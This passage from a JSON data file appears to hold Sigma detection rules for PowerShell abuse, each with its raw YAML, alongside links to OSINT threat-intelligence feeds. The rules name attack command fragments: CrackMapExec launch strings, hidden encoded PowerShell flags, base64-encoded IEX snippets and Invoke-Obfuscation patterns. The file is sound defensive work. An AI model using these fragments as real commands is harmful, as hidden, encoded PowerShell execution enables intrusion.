                            "raw": "author: Sean Metcalf (source), Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects the use of PSAttack PowerShell hack tool\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: PS ATTACK!!!\nfalsepositives:\n- Unknown\nid: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://adsecurity.org/?p=2921\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell PSAttack\n",
                            "sigma:id": "b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5",
                            "title": "PowerShell PSAttack",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fb843269-508c-4b76-8b8d-88679db22ce7",
                        "lookup_data": {
                            "description": "Commandline to launch powershell with a base64 payload",
                            "raw": "author: frack113\ndate: 2022/01/02\ndescription: Commandline to launch powershell with a base64 payload\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_azure:\n    ParentImage|contains:\n    - C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\n    - \\gc_worker.exe\n  filter_encoding:\n    CommandLine|contains: ' -Encoding '\n  selection:\n    CommandLine|contains:\n    - ' -e '\n    - ' -en '\n    - ' -enc '\n    - ' -enco'\n    - ' -ec '\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Unknown\nid: fb843269-508c-4b76-8b8d-88679db22ce7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets\n- https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\n- https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious Execution of Powershell with Base64\n",
                            "sigma:id": "fb843269-508c-4b76-8b8d-88679db22ce7",
                            "title": "Suspicious Execution of Powershell with Base64",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bf943c6-5146-4273-98dd-e958fd1e3abf",
                        "lookup_data": {
                            "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block",
                            "raw": "author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ndescription: Detects all variations of obfuscated powershell IEX invocation code generated\n  by Invoke-Obfuscation framework from the following code block\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|re: \\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\[\n  - CommandLine|re: \\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\[\n  - CommandLine|re: \\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\[\n  - CommandLine|re: \\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}\n  - CommandLine|re: \\*mdr\\*\\W\\s*\\)\\.Name\n  - CommandLine|re: \\$VerbosePreference\\.ToString\\(\n  - CommandLine|re: \\[String\\]\\s*\\$VerbosePreference\nfalsepositives:\n- Unknown\nid: 4bf943c6-5146-4273-98dd-e958fd1e3abf\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Obfuscated IEX Invocation\n",
                            "sigma:id": "4bf943c6-5146-4273-98dd-e958fd1e3abf",
                            "title": "Invoke-Obfuscation Obfuscated IEX Invocation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e6cb92b4-b470-4eb8-8a9d-d63e8583aae0",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via RUNDLL LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via RUNDLL LAUNCHER\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|contains|all:\n    - rundll32.exe\n    - shell32.dll\n    - shellexec_rundll\n    - powershell\nfalsepositives:\n- Unknown\nid: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell\n",
                            "sigma:id": "e6cb92b4-b470-4eb8-8a9d-d63e8583aae0",
                            "title": "Invoke-Obfuscation RUNDLL LAUNCHER - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "058f4380-962d-40a5-afce-50207d36d7e2",
                        "lookup_data": {
                            "description": "Detect various execution methods of the CrackMapExec pentesting framework",
                            "raw": "author: Thomas Patzke\ndate: 2020/05/22\ndescription: Detect various execution methods of the CrackMapExec pentesting framework\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - powershell.exe -exec bypass -noni -nop -w 1 -C \"\n    - 'powershell.exe -noni -nop -w 1 -enc '\n    CommandLine|endswith:\n    - cmd.exe /Q /c * 1> \\\\\\\\*\\\\*\\\\* 2>&1\n    - cmd.exe /C * > \\\\\\\\*\\\\*\\\\* 2>&1\n    - cmd.exe /C * > *\\\\Temp\\\\* 2>&1\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 058f4380-962d-40a5-afce-50207d36d7e2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/byt3bl33d3r/CrackMapExec\nstatus: stable\ntags:\n- attack.execution\n- attack.t1047\n- attack.t1053\n- attack.t1059.003\n- attack.t1059.001\n- attack.s0106\ntitle: CrackMapExec Command Execution\n",
                            "sigma:id": "058f4380-962d-40a5-afce-50207d36d7e2",
                            "title": "CrackMapExec Command Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                        "lookup_data": {
                            "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
                            "raw": "author: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2018/04/06\ndescription: Detects suspicious child processes of a Windows shell and scripting processes\n  such as wscript, rundll32, powershell, mshta...etc.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_amazon:\n    ParentCommandLine|contains:\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\n    - \\nessus_\n  filter_ccmcache:\n    CurrentDirectory|contains: \\ccmcache\\\n  filter_nessus:\n    CommandLine|contains: \\nessus_\n  selection:\n    Image|endswith:\n    - \\schtasks.exe\n    - \\nslookup.exe\n    - \\certutil.exe\n    - \\bitsadmin.exe\n    - \\mshta.exe\n    ParentImage|endswith:\n    - \\mshta.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\rundll32.exe\n    - \\cscript.exe\n    - \\wscript.exe\n    - \\wmiprvse.exe\n    - \\regsvr32.exe\nfalsepositives:\n- Administrative scripts\n- Microsoft SCCM\nfields:\n- CommandLine\n- ParentCommandLine\n- CurrentDirectory\n- Image\n- ParentImage\nid: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1059.005\n- attack.t1059.001\n- attack.t1218\ntitle: Windows Shell/Scripting Processes Spawning Suspicious Programs\n",
                            "sigma:id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                            "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c31364f7-8be6-4b77-8483-dd2b5a7b69a3",
                        "lookup_data": {
                            "description": "Detects powershell scripts that import modules from suspicious directories",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/10\ndescription: Detects powershell scripts that import modules from suspicious directories\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Import-Module \"$Env:Temp\\\n    - Import-Module '$Env:Temp\\\n    - Import-Module $Env:Temp\\\n    - Import-Module \"$Env:Appdata\\\n    - Import-Module '$Env:Appdata\\\n    - Import-Module $Env:Appdata\\\n    - Import-Module C:\\Users\\Public\\\n    - ipmo \"$Env:Temp\\\n    - ipmo '$Env:Temp\\\n    - ipmo $Env:Temp\\\n    - ipmo \"$Env:Appdata\\\n    - ipmo '$Env:Appdata\\\n    - ipmo $Env:Appdata\\\n    - ipmo C:\\Users\\Public\\\nfalsepositives:\n- Unknown\nid: c31364f7-8be6-4b77-8483-dd2b5a7b69a3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md\nrelated:\n- id: 21f9162c-5f5d-4b01-89a8-b705bd7d10ab\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Import PowerShell Modules From Suspicious Directories - ProcCreation\n",
                            "sigma:id": "c31364f7-8be6-4b77-8483-dd2b5a7b69a3",
                            "title": "Import PowerShell Modules From Suspicious Directories - ProcCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "636fd943-5631-4cc9-890a-4f400563533c",
                        "lookup_data": {
                            "description": "Scraper: DeftTorero: tactics, techniques and procedures of intrusions revealed",
                            "link": "http://www.botvrij.eu/data/feed-osint/636fd943-5631-4cc9-890a-4f400563533c.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1665780788",
                            "uuid": "636fd943-5631-4cc9-890a-4f400563533c",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "994cac2b-92c2-44bf-8853-14f6ca39fbda",
                        "lookup_data": {
                            "description": "Detects remote thread injection events based on action seen used by bumblebee",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/27\ndescription: Detects remote thread injection events based on action seen used by bumblebee\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\wabmig.exe\n    - \\wab.exe\n    - \\ImagingDevices.exe\n    TargetImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 994cac2b-92c2-44bf-8853-14f6ca39fbda\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nreferences:\n- https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.011\n- attack.t1059.001\ntitle: Bumblebee Remote Thread Creation\n",
                            "sigma:id": "994cac2b-92c2-44bf-8853-14f6ca39fbda",
                            "title": "Bumblebee Remote Thread Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a0edd39f-a0c6-4c17-8141-261f958e8d8f",
                        "lookup_data": {
                            "description": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\n",
                            "raw": "author: frack113\ndate: 2022/01/06\ndescription: 'Adversaries may abuse PowerShell commands and scripts for execution.\n\n  PowerShell is a powerful interactive command-line interface and scripting environment\n  included in the Windows operating system\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - New-PSSession\n    - '-ComputerName '\nfalsepositives:\n- Legitimate administrative script\nid: a0edd39f-a0c6-4c17-8141-261f958e8d8f\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-10---powershell-invoke-downloadcradle\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Remote Session Creation\n",
                            "sigma:id": "a0edd39f-a0c6-4c17-8141-261f958e8d8f",
                            "title": "PowerShell Remote Session Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "99138053-ae5d-4bcf-b2f8-0954edb204bc",
                        "lookup_data": {
                            "description": "Scraper: Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor - SentinelOne",
                            "link": "http://www.botvrij.eu/data/feed-osint/99138053-ae5d-4bcf-b2f8-0954edb204bc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1667736035",
                            "uuid": "99138053-ae5d-4bcf-b2f8-0954edb204bc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ac175779-025a-4f12-98b0-acdaeb77ea85",
                        "lookup_data": {
                            "description": "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019/01/09\ndescription: Detects a suspicious command line execution that invokes PowerShell with\n  reference to an AppData folder\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains:\n    - powershell.exe\n    - \\powershell\n    - \\pwsh\n    - pwsh.exe\n  selection2:\n    CommandLine|contains:\n    - Local\\\n    - Roaming\\\n    CommandLine|contains|all:\n    - '/c '\n    - \\AppData\\\nfalsepositives:\n- Administrative scripts\nid: ac175779-025a-4f12-98b0-acdaeb77ea85\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://twitter.com/JohnLaTwC/status/1082851155481288706\n- https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Script Run in AppData\n",
                            "sigma:id": "ac175779-025a-4f12-98b0-acdaeb77ea85",
                            "title": "PowerShell Script Run in AppData",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e32d4572-9826-4738-b651-95fa63747e8a",
                        "lookup_data": {
                            "description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/01/29\ndescription: Detects usage of the \"FromBase64String\" function in the commandline which\n  is used to decode a base64 encoded string\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ::FromBase64String(\nfalsepositives:\n- Administrative script libraries\nid: e32d4572-9826-4738-b651-95fa63747e8a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nreferences:\n- https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\nstatus: test\ntags:\n- attack.t1027\n- attack.defense_evasion\n- attack.t1140\n- attack.t1059.001\ntitle: Base64 Encoded PowerShell Command Detected\n",
                            "sigma:id": "e32d4572-9826-4738-b651-95fa63747e8a",
                            "title": "Base64 Encoded PowerShell Command Detected",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8ca7004b-e620-4ecb-870e-86129b5b8e75",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of Environment Variables to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - /c\n    - /r\n    ImagePath|contains|all:\n    - cmd\n    - '\"set'\n    - -f\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 8ca7004b-e620-4ecb-870e-86129b5b8e75\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR+ Launcher - System\n",
                            "sigma:id": "8ca7004b-e620-4ecb-870e-86129b5b8e75",
                            "title": "Invoke-Obfuscation VAR+ Launcher - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "59e938ff-0d6d-4dc3-b13f-36cc28734d4e",
                        "lookup_data": {
                            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
                            "raw": "author: Julia Fomina, oscd.community\ndate: 2020/10/08\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for\n  testing)\ndetection:\n  cmd_execution:\n    CommandLine|contains|all:\n    - pester\n    - ;\n    Image|endswith: \\cmd.exe\n  condition: powershell_module or (cmd_execution and get_help)\n  get_help:\n    CommandLine|contains:\n    - help\n    - '?'\n  powershell_module:\n    CommandLine|contains|all:\n    - Pester\n    - Get-Help\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Legitimate use of Pester for writing tests for Powershell scripts and modules\nid: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://twitter.com/Oddvarmoe/status/993383596244258816\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1216\ntitle: Execute Code with Pester.bat\n",
                            "sigma:id": "59e938ff-0d6d-4dc3-b13f-36cc28734d4e",
                            "title": "Execute Code with Pester.bat",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cc08d590-8b90-413a-aff6-31d1a99678d7",
                        "lookup_data": {
                            "description": "Detects new commands that add new printer port which point to suspicious file",
                            "raw": "author: EagleEye Team, Florian Roth\ndate: 2020/05/13\ndescription: Detects new commands that add new printer port which point to suspicious\n  file\ndetection:\n  condition: (selection1 and selection2) or selection3\n  selection1:\n    CommandLine|contains: Add-PrinterPort -Name\n  selection2:\n    CommandLine|contains:\n    - .exe\n    - .dll\n    - .bat\n  selection3:\n    CommandLine|contains: Generic / Text Only\nfalsepositives:\n- New printer port install on host\nid: cc08d590-8b90-413a-aff6-31d1a99678d7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://windows-internals.com/printdemon-cve-2020-1048/\nstatus: test\ntags:\n- attack.persistence\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PrinterPorts Creation (CVE-2020-1048)\n",
                            "sigma:id": "cc08d590-8b90-413a-aff6-31d1a99678d7",
                            "title": "Suspicious PrinterPorts Creation (CVE-2020-1048)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0c718a5e-4284-4fb9-b4d9-b9a50b3a1974",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of stdin to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of stdin to execute PowerShell\ndetection:\n  condition: all of selection*\n  selection:\n    EventID: 4697\n    ServiceFileName|contains|all:\n    - cmd\n    - powershell\n  selection2:\n    ServiceFileName|contains:\n    - ${input}\n    - noexit\n  selection3:\n    ServiceFileName|contains:\n    - ' /c '\n    - ' /r '\nfalsepositives:\n- Unknown\nid: 0c718a5e-4284-4fb9-b4d9-b9a50b3a1974\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 72862bf2-0eb1-11eb-adc1-0242ac120002\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation STDIN+ Launcher - Security\n",
                            "sigma:id": "0c718a5e-4284-4fb9-b4d9-b9a50b3a1974",
                            "title": "Invoke-Obfuscation STDIN+ Launcher - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "88f680b8-070e-402c-ae11-d2914f2257f1",
                        "lookup_data": {
                            "description": "Detects usage of a base64 encoded \"IEX\" string in a process command line",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/08/23\ndescription: Detects usage of a base64 encoded \"IEX\" string in a process command line\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|base64offset|contains:\n    - IEX ([\n    - iex ([\n    - iex (New\n    - IEX (New\n  - CommandLine|contains:\n    - SQBFAFgAIAAoAFsA\n    - kARQBYACAAKABbA\n    - JAEUAWAAgACgAWw\n    - aQBlAHgAIAAoAFsA\n    - kAZQB4ACAAKABbA\n    - pAGUAeAAgACgAWw\n    - aQBlAHgAIAAoAE4AZQB3A\n    - kAZQB4ACAAKABOAGUAdw\n    - pAGUAeAAgACgATgBlAHcA\n    - SQBFAFgAIAAoAE4AZQB3A\n    - kARQBYACAAKABOAGUAdw\n    - JAEUAWAAgACgATgBlAHcA\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 88f680b8-070e-402c-ae11-d2914f2257f1\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Base64 Encoded IEX Keyword\n",
                            "sigma:id": "88f680b8-070e-402c-ae11-d2914f2257f1",
                            "title": "PowerShell Base64 Encoded IEX Keyword",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "34493f6d-9441-45df-9cb4-4de473709081",
                        "lookup_data": {
                            "description": "#StopRansomware: MedusaLocker",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/34493f6d-9441-45df-9cb4-4de473709081.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1657009711",
                            "uuid": "34493f6d-9441-45df-9cb4-4de473709081",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3d304fda-78aa-43ed-975c-d740798a49c1",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (rule)\ndate: 2017/03/12\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: all of them\n  encoded:\n  - ' -enc '\n  - ' -EncodedCommand '\n  hidden:\n  - ' -w hidden '\n  - ' -window hidden '\n  - ' -windowstyle hidden '\n  noninteractive:\n  - ' -noni '\n  - ' -noninteractive '\nfalsepositives:\n- Penetration tests\n- Very special / sneaky PowerShell scripts\nid: 3d304fda-78aa-43ed-975c-d740798a49c1\nlevel: high\nlogsource:\n  product: windows\n  service: powershell\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1086\ntitle: Suspicious PowerShell Invocations - Generic\n",
                            "sigma:id": "3d304fda-78aa-43ed-975c-d740798a49c1",
                            "title": "Suspicious PowerShell Invocations - Generic",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f7385ee2-0e0c-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated use of Clip.exe to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains|all:\n    - cmd\n    - clip\n    - 'clipboard]::'\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: f7385ee2-0e0c-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/27\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation CLIP+ Launcher - System\n",
                            "sigma:id": "f7385ee2-0e0c-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation CLIP+ Launcher - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4edf51e1-cb83-4e1a-bc39-800e396068e3",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated use of Clip.exe to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    ServiceFileName|contains|all:\n    - cmd\n    - '&&'\n    - 'clipboard]::'\nfalsepositives:\n- Unknown\nid: 4edf51e1-cb83-4e1a-bc39-800e396068e3\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: f7385ee2-0e0c-11eb-adc1-0242ac120002\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation CLIP+ Launcher - Security\n",
                            "sigma:id": "4edf51e1-cb83-4e1a-bc39-800e396068e3",
                            "title": "Invoke-Obfuscation CLIP+ Launcher - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ed965133-513f-41d9-a441-e38076a0798f",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/12\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: all of selection*\n  selection_encoded:\n    ScriptBlockText|contains:\n    - ' -enc '\n    - ' -EncodedCommand '\n    - ' -ec '\n  selection_hidden:\n    ScriptBlockText|contains:\n    - ' -w hidden '\n    - ' -window hidden '\n    - ' -windowstyle hidden '\n    - ' -w 1 '\n  selection_noninteractive:\n    ScriptBlockText|contains:\n    - ' -noni '\n    - ' -noninteractive '\nfalsepositives:\n- Very special / sneaky PowerShell scripts\nid: ed965133-513f-41d9-a441-e38076a0798f\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/03\nrelated:\n- id: 3d304fda-78aa-43ed-975c-d740798a49c1\n  type: derived\n- id: bbb80e91-5746-4fbe-8898-122e2cafdbf4\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Invocations - Generic\n",
                            "sigma:id": "ed965133-513f-41d9-a441-e38076a0798f",
                            "title": "Suspicious PowerShell Invocations - Generic",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "13acf386-b8c6-4fe0-9a6e-c4756b974698",
                        "lookup_data": {
                            "description": "Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound connections to ports 5985 OR 5986",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/09/12\ndescription: Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound\n  connections to ports 5985 OR 5986\ndetection:\n  condition: selection\n  selection:\n    DestPort:\n    - 5985\n    - 5986\n    EventID: 5156\n    LayerRTID: 44\nfalsepositives:\n- Legitimate use of remote PowerShell execution\nid: 13acf386-b8c6-4fe0-9a6e-c4756b974698\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Remote PowerShell Sessions Network Connections (WinRM)\n",
                            "sigma:id": "13acf386-b8c6-4fe0-9a6e-c4756b974698",
                            "title": "Remote PowerShell Sessions Network Connections (WinRM)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
